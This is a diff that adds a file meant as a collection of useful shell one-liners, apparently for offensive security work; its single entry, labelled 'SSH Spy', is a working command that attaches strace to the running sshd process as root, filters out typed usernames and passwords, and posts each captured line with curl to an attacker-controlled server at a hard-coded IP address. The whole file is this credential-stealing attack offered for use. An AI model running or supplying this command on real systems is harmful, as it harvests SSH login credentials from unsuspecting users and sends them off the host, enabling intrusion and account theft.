@@ -1,0 +1,11 @@
+#This will be a collection of 1 liners which are useful.
+
+
+#SSH Spy
+#Grabs usernames and passwords from SSH thorugh strace and send them back to an attacker server. Requires root priv and strace to be installed.
+#See blog article at ___ for detailed instructions and results interpretation.
+z=`ps aux | grep -i sshd | grep "listen" | sed -e 's/  */ /g' | cut -d" " -f 2`;strace -t -e read,write,openat -f -p $z 2>&1 | grep -v "~/.profile" | grep --line-buffered -F -e 'write(5, "\0\0\0\7' -e '\f\0\0\0' -e '.profile' | while read -r LINE; do curl -X POST --data-binary "$LINE" http://192.168.42.51:8080/sshspy &>/dev/null;done
+
+
+
+
